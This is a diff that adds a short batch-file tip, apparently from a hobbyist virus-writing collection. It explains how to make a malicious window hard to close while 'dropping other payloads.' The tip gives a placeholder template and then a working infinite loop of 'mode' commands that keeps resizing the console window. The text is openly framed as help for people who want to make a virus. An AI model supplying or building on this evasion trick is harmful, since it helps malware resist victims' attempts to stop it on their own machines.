@@ -1,0 +1,34 @@
+How to make a window hard to stop while dropping other payloads:
+
+:: If you want to make a virus but are either to lazy or too imature
+:: in batchfile coding to use an exe compiler to make it invisible, use
+:: a code like this so it is almost impossible to close a windows. The
+:: more mode setting you use the harder it is to catch it:
+
+
+:(Batchfile)
+mode (Your Coordinates)
+mode (Your Coordinates)
+mode (Your Coordinates)
+mode (Your Coordinates)
+mode (Your Coordinates)
+mode (Your Coordinates)
+mode (Your Coordinates)
+goto (Batchfile)
+
+
+
+EXAMPLE:
+=========
+
+:loop
+mode 1000,1000
+mode 60,15
+mode 80,25
+mode 80,300
+mode 100,30
+mode 14,1
+mode 50,50
+mode 23,87
+mode 43,7
+goto loop
